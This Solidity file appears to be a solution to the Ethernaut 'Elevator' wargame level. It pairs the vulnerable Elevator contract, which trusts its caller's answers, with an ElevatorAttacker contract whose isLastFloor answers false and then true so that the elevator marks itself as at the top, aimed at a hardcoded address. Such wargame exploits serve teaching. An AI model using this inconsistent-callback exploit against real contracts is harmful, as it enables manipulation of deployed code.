// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttacker is Building {
    
    uint public count = 0;
    
    function isLastFloor(uint _floor) public override returns (bool) {
        if(count == 1) {
            return true;
        }
        count++;
        return false;
    }
    
    function goTo() public {
        Elevator elevator = Elevator(0x2260c447E94c7a80CaA8CCa1D7d418709b1b0C4d);
        elevator.goTo(1);
    }
}